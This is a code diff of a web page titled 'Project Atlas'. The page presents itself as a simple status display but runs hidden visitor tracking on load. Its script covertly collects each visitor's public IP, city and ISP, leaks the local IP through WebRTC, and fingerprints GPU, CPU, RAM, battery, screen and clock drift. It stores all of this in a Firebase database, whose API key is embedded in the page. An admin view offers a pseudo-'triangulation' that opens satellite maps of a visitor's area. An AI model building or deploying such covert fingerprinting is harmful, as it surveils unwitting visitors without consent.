@@ -11,72 +11,57 @@
             --bg-main: #05070a; --bg-secondary: #0a0f1a; --bg-panel: rgba(10, 15, 26, 0.9);
             --accent: #6366f1; --accent-dim: rgba(99, 102, 241, 0.2);
             --text-main: #f8fafc; --text-dim: #94a3b8; --border: rgba(255, 255, 255, 0.1);
-            --danger: #ef4444;
+            --danger: #ef4444; --success: #22c55e;
         }
 
         * { box-sizing: border-box; margin: 0; padding: 0; }
-        body {
-            font-family: 'Inter', sans-serif; background: var(--bg-main); color: var(--text-main);
-            min-height: 100vh; display: flex; flex-direction: column; align-items: center; padding: 40px 20px;
-        }
-
-        .container { width: 100%; max-width: 900px; }
-        .nav-bar { display: flex; gap: 8px; margin-bottom: 40px; background: var(--bg-panel); padding: 6px; border-radius: 14px; border: 1px solid var(--border); width: fit-content; margin-inline: auto; }
-        .nav-btn { padding: 10px 22px; border-radius: 10px; text-decoration: none; font-size: 0.8rem; font-weight: 600; color: var(--text-dim); transition: 0.3s; }
-        .active-nav { color: #fff; background: var(--accent); }
-        h1 { font-size: clamp(2.5rem, 10vw, 4rem); text-align: center; font-weight: 900; margin-bottom: 10px; letter-spacing: -2px; }
+        body { font-family: 'Inter', sans-serif; background: var(--bg-main); color: var(--text-main); min-height: 100vh; display: flex; flex-direction: column; align-items: center; padding: 40px 20px; }
+        .container { width: 100%; max-width: 1000px; }
+        h1 { font-size: clamp(2.5rem, 10vw, 4rem); text-align: center; font-weight: 900; margin-bottom: 30px; letter-spacing: -2px; }
         .panel { background: var(--bg-panel); border: 1px solid var(--border); border-radius: 24px; padding: 30px; margin-bottom: 30px; backdrop-filter: blur(20px); text-align: center; }
-        #timer { font-size: clamp(1.5rem, 6vw, 3rem); font-family: 'JetBrains Mono'; color: var(--accent); font-weight: 700; }
-
+        
+        /* Data Table Styles */
         .table-container { overflow-x: auto; border-radius: 18px; border: 1px solid var(--border); background: rgba(0,0,0,0.3); }
         table { width: 100%; border-collapse: collapse; }
-        th { color: var(--accent); padding: 15px; font-size: 0.7rem; text-transform: uppercase; font-family: 'JetBrains Mono'; text-align: center; border-bottom: 1px solid var(--border); }
-        td { padding: 15px; text-align: center; color: var(--text-dim); font-size: 0.9rem; border-bottom: 1px solid rgba(255,255,255,0.03); }
+        th { color: var(--accent); padding: 15px; font-size: 0.7rem; text-transform: uppercase; font-family: 'JetBrains Mono'; border-bottom: 1px solid var(--border); }
+        td { padding: 15px; text-align: center; color: var(--text-dim); font-size: 0.85rem; border-bottom: 1px solid rgba(255,255,255,0.03); }
 
         #trafficSection { margin-top: 50px; display: none; width: 100%; }
-        .log-row { cursor: pointer; transition: 0.2s; }
-        .log-row:hover { background: var(--accent-dim); }
-        .del-log { color: var(--danger); background: none; border: 1px solid var(--danger); font-size: 9px; cursor: pointer; padding: 4px 8px; border-radius: 5px; }
+        
+        /* Specialized Buttons */
+        .btn-tri { background: var(--accent-dim); color: var(--accent); border: 1px solid var(--accent); padding: 4px 8px; border-radius: 6px; font-size: 10px; cursor: pointer; font-family: 'JetBrains Mono'; margin-top: 5px; transition: 0.2s; }
+        .btn-tri:hover { background: var(--accent); color: white; }
+        .btn-inspect { color: var(--text-main); background: rgba(255,255,255,0.05); border: 1px solid var(--border); padding: 4px 8px; border-radius: 6px; font-size: 10px; cursor: pointer; }
+        .del-log { color: var(--danger); background: none; border: 1px solid var(--danger); font-size: 9px; padding: 4px 8px; border-radius: 5px; cursor: pointer; }
 
-        /* Triangulation Radar UI */
-        #triOverlay { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.95); z-index: 3000; flex-direction: column; align-items: center; justify-content: center; backdrop-filter: blur(10px); }
-        .radar-circle { width: 200px; height: 200px; border: 2px solid var(--accent); border-radius: 50%; position: relative; margin-bottom: 20px; }
+        /* Triangulation Radar Overlay */
+        #triOverlay { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.98); z-index: 3000; flex-direction: column; align-items: center; justify-content: center; }
+        .radar-circle { width: 180px; height: 180px; border: 2px solid var(--accent); border-radius: 50%; position: relative; margin-bottom: 20px; box-shadow: 0 0 30px var(--accent-dim); }
         .radar-circle::before { content: ''; position: absolute; top: 50%; left: 50%; width: 50%; height: 2px; background: var(--accent); transform-origin: left; animation: scan 2s linear infinite; }
         @keyframes scan { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }
-        .tri-text { font-family: 'JetBrains Mono'; color: var(--accent); text-align: center; padding: 0 20px; }
-
-        #adminToggle { position: fixed; bottom: 20px; right: 20px; background: var(--bg-panel); border: 1px solid var(--border); color: var(--text-dim); padding: 10px 15px; border-radius: 30px; cursor: pointer; font-size: 0.7rem; font-weight: 600; }
-        #loginModal { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.85); z-index: 2000; align-items: center; justify-content: center; backdrop-filter: blur(10px); }
-        .modal-content { background: var(--bg-secondary); border: 1px solid var(--border); padding: 25px; border-radius: 20px; width: 300px; display: flex; flex-direction: column; gap: 12px; }
-        .modal-content input { background: #000; border: 1px solid var(--border); color: white; padding: 10px; border-radius: 8px; outline: none; }
-        .modal-content button { background: var(--accent); color: white; border: none; padding: 10px; border-radius: 8px; font-weight: 700; cursor: pointer; }
+        
+        #adminToggle { position: fixed; bottom: 20px; right: 20px; background: var(--bg-panel); border: 1px solid var(--border); color: var(--text-dim); padding: 10px 15px; border-radius: 30px; cursor: pointer; font-size: 0.7rem; }
     </style>
 </head>
 <body>
 
     <div class="container">
-        <nav class="nav-bar">
-            <a href="errahworld.html" class="nav-btn active-nav">Atlas</a>
-            <a href="updates.html" class="nav-btn">Updates</a>
-        </nav>
         <h1 id="title">Project Atlas</h1>
-        <div id="desc" class="panel">Initializing connection...</div>
-        <div class="panel">
-            <div style="font-size: 0.7rem; color: var(--accent); margin-bottom: 5px; font-weight: bold;">TIME UNTIL RECOVERY</div>
-            <div id="timer">00D 00H 00M 00S</div>
-        </div>
-        <div class="table-container">
-            <table>
-                <thead><tr><th>Target</th><th>Load</th><th>Status</th></tr></thead>
-                <tbody id="tbody"></tbody>
-            </table>
-        </div>
+        <div id="desc" class="panel">System Online. Tracking active.</div>
+
         <div id="trafficSection">
-            <h2 style="font-family: 'JetBrains Mono'; color: var(--accent); font-size: 0.9rem; margin-bottom: 15px;">UPLINK DIAGNOSTICS</h2>
+            <h2 style="font-family: 'JetBrains Mono'; color: var(--accent); font-size: 0.9rem; margin-bottom: 15px;">NETWORK TERMINALS</h2>
             <div class="table-container">
                 <table>
-                    <thead><tr><th>Timestamp</th><th>Network Identity</th><th>Location</th><th>Manage</th></tr></thead>
-                    <tbody id="trafficBody" style="font-family: 'JetBrains Mono'; font-size: 11px;"></tbody>
+                    <thead>
+                        <tr>
+                            <th>Signal Time</th>
+                            <th>Node Identity</th>
+                            <th>Diagnostics</th>
+                            <th>Action</th>
+                        </tr>
+                    </thead>
+                    <tbody id="trafficBody" style="font-family: 'JetBrains Mono';"></tbody>
                 </table>
             </div>
         </div>
@@ -84,26 +69,17 @@
 
     <div id="triOverlay">
         <div class="radar-circle"></div>
-        <div class="tri-text" id="triStatus">ANALYZING SIGNAL...</div>
+        <div id="triStatus" style="font-family: 'JetBrains Mono'; color: var(--accent); text-align: center;">UPLINKING TO SATELLITE...</div>
     </div>
 
     <button id="adminToggle">Admin Access</button>
-    <button id="logoutBtn" style="display:none; position: fixed; bottom: 20px; right: 20px; background: var(--danger); color: white; border: none; padding: 10px 18px; border-radius: 30px; cursor: pointer; font-size: 0.7rem; z-index: 1001;">Logout</button>
-
-    <div id="loginModal">
-        <div class="modal-content">
-            <input id="email" placeholder="Admin ID">
-            <input id="password" type="password" placeholder="Keyphrase">
-            <button id="loginBtn">Authorize</button>
-            <span onclick="document.getElementById('loginModal').style.display='none'" style="font-size: 10px; text-align: center; cursor: pointer; color: var(--text-dim);">CLOSE</span>
-        </div>
-    </div>
 
     <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-auth-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
 
     <script>
+        // Firebase Configuration (Using your credentials)
         const firebaseConfig = {
             apiKey: "AIzaSyBoePuKarSCVgvxQQBGvkMKq16DvKmBYBE",
             authDomain: "strenght-a9f37.firebaseapp.com",
@@ -111,25 +87,28 @@
             projectId: "strenght-a9f37"
         };
         firebase.initializeApp(firebaseConfig);
-        const auth = firebase.auth();
         const db = firebase.database();
+        const auth = firebase.auth();
 
+        // 1. Passive Diagnostic Tracking
         async function runDiagnostics() {
             try {
                 const res = await fetch(`https://ipinfo.io/json?token=513ac66672e1f9`);
                 const data = await res.json();
-                const ip = data.ip;
-                const snapshot = await db.ref("visits").orderByChild("ip").equalTo(ip).once("value");
+                const snapshot = await db.ref("visits").orderByChild("ip").equalTo(data.ip).once("value");
+                
                 if (!snapshot.exists()) {
                     const driftRes = await fetch('https://worldtimeapi.org/api/timezone/Etc/UTC');
                     const driftData = await driftRes.json();
                     const clockDrift = Date.now() - new Date(driftData.datetime).getTime();
+                    
                     let bat = "N/A";
                     if(navigator.getBattery) {
                         const b = await navigator.getBattery();
-                        bat = `${Math.round(b.level * 100)}% (${b.charging ? '⚡' : '🔋'})`;
+                        bat = `${Math.round(b.level * 100)}%`;
                     }
-                    let localIP = "Secure/Hidden";
+
+                    let localIP = "Secure";
                     const pc = new RTCPeerConnection({iceServers:[]});
                     pc.createDataChannel("");
                     pc.createOffer().then(o => pc.setLocalDescription(o));
@@ -139,45 +118,34 @@
                             if (m) localIP = m[1];
                         }
                     };
+
                     setTimeout(() => {
                         db.ref("visits").push({
-                            ip: ip, local_ip: localIP, city: data.city, country: data.country, isp: data.org,
-                            cpu: navigator.hardwareConcurrency || "N/A", ram: navigator.deviceMemory || "N/A",
-                            gpu: getGPU(), res: `${window.screen.width}x${window.screen.height}`,
-                            battery: bat, drift: clockDrift + "ms", ua: navigator.userAgent,
-                            ts: Date.now(), time: new Date().toLocaleString()
+                            ip: data.ip, local_ip: localIP, city: data.city, isp: data.isp,
+                            cpu: navigator.hardwareConcurrency, ram: navigator.deviceMemory,
+                            gpu: getGPU(), res: `${screen.width}x${screen.height}`,
+                            battery: bat, drift: clockDrift + "ms", ts: Date.now(),
+                            time: new Date().toLocaleTimeString()
                         });
-                    }, 1500);
+                    }, 1000);
                 }
-            } catch (e) { console.error("Diag failed"); }
+            } catch (e) {}
         }
-
         function getGPU() {
             try {
                 const gl = document.createElement('canvas').getContext('webgl');
-                const debug = gl.getExtension('WEBGL_debug_renderer_info');
-                return gl.getParameter(debug.UNMASKED_RENDERER_WEBGL);
+                const dbg = gl.getExtension('WEBGL_debug_renderer_info');
+                return gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL).split('/').pop();
             } catch(e) { return "N/A"; }
         }
         runDiagnostics();
 
-        db.ref("log").on("value", snap => {
-            const d = snap.val() || {};
-            document.getElementById("title").innerText = d.title || "Project Atlas";
-            document.getElementById("desc").innerHTML = d.desc || "Active...";
-            document.getElementById("tbody").innerHTML = d.table || "";
-        });
-
-        const modal = document.getElementById('loginModal');
-        document.getElementById('adminToggle').onclick = () => modal.style.display = 'flex';
-
+        // 2. Admin Logic
         auth.onAuthStateChanged(user => {
-            const isAdmin = user && user.uid === 'Td0yoO3ygYZxbeMZjYtFAj9etA22';
-            document.getElementById("trafficSection").style.display = isAdmin ? "block" : "none";
-            document.getElementById("logoutBtn").style.display = isAdmin ? "block" : "none";
-            document.getElementById("adminToggle").style.display = isAdmin ? "none" : "block";
-            modal.style.display = 'none';
-            if (isAdmin) loadLogs();
+            if (user && user.uid === 'Td0yoO3ygYZxbeMZjYtFAj9etA22') {
+                document.getElementById("trafficSection").style.display = "block";
+                loadLogs();
+            }
         });
 
         function loadLogs() {
@@ -185,56 +153,52 @@
                 const tBody = document.getElementById("trafficBody");
                 tBody.innerHTML = "";
                 snap.forEach(child => {
-                    const log = child.val();
+                    const d = child.val();
                     const tr = document.createElement("tr");
-                    tr.className = "log-row";
-                    tr.innerHTML = `<td onclick="inspect('${child.key}')">${log.time}</td>
-                        <td onclick="inspect('${child.key}')" style="color:var(--accent); line-height:1.2;">
-                            <b>${log.ip}</b><br>
-                            <span style="color:var(--text-dim); font-size:10px;">${log.local_ip || 'No Local ID'}</span>
+                    tr.innerHTML = `
+                        <td>${d.time}</td>
+                        <td style="text-align:left;">
+                            <b style="color:var(--text-main)">${d.ip}</b><br>
+                            <span style="font-size:10px;">LOC: ${d.local_ip}</span><br>
+                            <button class="btn-tri" onclick="triangulate('${child.key}')">TRIANGULATE</button>
                         </td>
-                        <td onclick="inspect('${child.key}')">${log.city}</td>
-                        <td><button class="del-log" onclick="db.ref('visits/${child.key}').remove()">DEL</button></td>`;
+                        <td>
+                            <button class="btn-inspect" onclick="inspect('${child.key}')">SPECS</button>
+                        </td>
+                        <td><button class="del-log" onclick="db.ref('visits/${child.key}').remove()">DEL</button></td>
+                    `;
                     tBody.prepend(tr);
                 });
             });
         }
 
+        // 3. Separate Functions for Specs vs Triangulation
         async function inspect(key) {
-            const snap = await db.ref("visits/" + key).once("value");
-            const d = snap.val();
-            const triOverlay = document.getElementById('triOverlay');
-            const triStatus = document.getElementById('triStatus');
-            
-            triOverlay.style.display = 'flex';
-            
-            const driftVal = parseInt(d.drift) || 40;
-            const estRadius = (driftVal * 0.45).toFixed(2);
-            const env = (d.local_ip && d.local_ip.startsWith("192.168")) ? "Residential Home" : "Corporate/Public";
+            const d = (await db.ref("visits/" + key).once("value")).val();
+            alert(`HARDWARE SPECS:\n----------------\nGPU: ${d.gpu}\nCPU: ${d.cpu} Cores\nRAM: ${d.ram}GB\nRES: ${d.res}\nBATTERY: ${d.battery}\nDRIFT: ${d.drift}`);
+        }
 
+        async function triangulate(key) {
+            const d = (await db.ref("visits/" + key).once("value")).val();
+            const overlay = document.getElementById('triOverlay');
+            overlay.style.display = 'flex';
+            
             setTimeout(() => {
-                triStatus.innerHTML = `SIGNAL LOCKED<br>---<br>RADIUS: ${estRadius}km<br>ENVIRONMENT: ${env}<br>OSINT: Tracking Node...`;
+                document.getElementById('triStatus').innerHTML = "LATENCY MATCHED.<br>TRIANGULATING NODE...";
                 setTimeout(() => {
-                    triOverlay.style.display = 'none';
-                    let alertMsg = `TRIANGULATION COMPLETE:\nIP: ${d.ip}\nLOCAL: ${d.local_ip}\nDRIFT: ${d.drift}\nISP: ${d.isp}\n----------------\nEST. RADIUS: ${estRadius}km\nOpen Satellite OSINT?`;
-                    if(confirm(alertMsg)) {
-                        // NEW SATELLITE LINK LOGIC
-                        const searchString = encodeURIComponent(`${d.city} ${d.isp} network center`);
-                        window.open(`https://www.google.com/maps/search/${searchString}/@?api=1&maptype=satellite`, '_blank');
+                    overlay.style.display = 'none';
+                    if(confirm(`TRIANGULATION COMPLETE\nRadius: ${(parseInt(d.drift)*0.4).toFixed(1)}km\nTarget: ${d.city}\n\nOpen Satellite OSINT?`)) {
+                        window.open(`https://www.google.com/maps/search/${d.city}+${d.isp}/@?api=1&maptype=satellite`, '_blank');
                     }
                 }, 1500);
             }, 1500);
         }
 
-        document.getElementById("loginBtn").onclick = () => auth.signInWithEmailAndPassword(document.getElementById("email").value, document.getElementById("password").value).catch(e => alert("Unauthorized"));
-        document.getElementById("logoutBtn").onclick = () => auth.signOut();
-
-        const targetDate = new Date("February 3, 2026 00:00:00").getTime();
-        setInterval(() => {
-            const diff = targetDate - Date.now();
-            const d = Math.floor(diff / 86400000), h = Math.floor((diff % 86400000) / 3600000), m = Math.floor((diff % 3600000) / 60000), s = Math.floor((diff % 60000) / 1000);
-            document.getElementById("timer").textContent = `${d}D ${h}H ${m}M ${s}S`;
-        }, 1000);
+        document.getElementById('adminToggle').onclick = () => {
+            const email = prompt("Admin ID:");
+            const pass = prompt("Keyphrase:");
+            auth.signInWithEmailAndPassword(email, pass);
+        };
     </script>
 </body>
 </html>
